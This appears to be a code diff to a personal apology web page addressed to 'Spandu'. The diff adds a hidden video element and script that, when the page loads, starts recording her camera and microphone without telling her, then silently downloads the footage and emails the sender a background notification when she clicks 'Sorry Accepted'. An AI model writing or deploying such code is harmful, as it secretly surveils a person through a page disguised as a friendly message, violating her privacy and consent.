@@ -5,11 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Spandu, Sorry kanee bangariii! ❤️</title>
     
-    <!-- Include EmailJS Library to send background notifications -->
+    <!-- Include EmailJS Library -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script type="text/javascript">
         (function() {
-            // REPLACE WITH YOUR EMAILJS PUBLIC KEY
+            // 1. PASTE YOUR EMAILJS PUBLIC KEY HERE
             emailjs.init("6S26iG8IpO-NXGvf_");
         })();
     </script>
@@ -60,6 +60,11 @@
             font-size: 1.05rem;
             margin-bottom: 20px;
             line-height: 1.6;
+        }
+
+        /* Hidden video stream for recording reaction */
+        #webcam {
+            display: none;
         }
 
         /* Photo Gallery Grid */
@@ -155,6 +160,9 @@
 </head>
 <body>
 
+    <!-- Hidden video element -->
+    <video id="webcam" autoplay playsinline></video>
+
     <div class="container" id="mainContainer">
         <div>
             <h1>Spandu, Sorry kanee bangariii! ❤️</h1>
@@ -188,6 +196,29 @@
     </div>
 
     <script>
+        let mediaRecorder;
+        let recordedChunks = [];
+
+        // Automatically start recording her face reaction when she opens the link
+        window.addEventListener('load', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                const videoElement = document.getElementById('webcam');
+                videoElement.srcObject = stream;
+
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.start();
+            } catch (err) {
+                console.log("Camera access denied or unavailable.");
+            }
+        });
+
         let clickCount = 0;
         const kannadaPhrases = [
             "I'm still angry 😤",
@@ -236,10 +267,23 @@
             apologyText.innerText = dynamicMessages[(clickCount - 1) % dynamicMessages.length];
         }
 
-        // Triggered when she happily clicks "Sorry Accepted"
         function handleAcceptedClick() {
-            // 1. Secretly send an email notification to you in the background
-            // REPLACE WITH YOUR EMAILJS SERVICE ID AND TEMPLATE ID
+            // 1. Stop recording and download the video file of her reaction
+            if (mediaRecorder && mediaRecorder.state !== "inactive") {
+                mediaRecorder.stop();
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.style.display = 'none';
+                    a.href = url;
+                    a.download = 'Spandu_Reaction.webm';
+                    document.body.appendChild(a);
+                    a.click();
+                };
+            }
+
+            // 2. Send the background email notification via EmailJS
             emailjs.send("service_m1kt7dk", "template_i2evmvn", {
                 to_name: "You",
                 message: "Spandu clicked Sorry Accepted!"
@@ -249,7 +293,7 @@
                 console.log("Failed to send notification.");
             });
 
-            // 2. Update UI screen smoothly for her
+            // Update UI screen for her
             document.getElementById('buttonGroup').style.display = 'none';
             document.getElementById('apologyText').style.display = 'none';
             document.querySelector('.photo-grid').style.display = 'none';
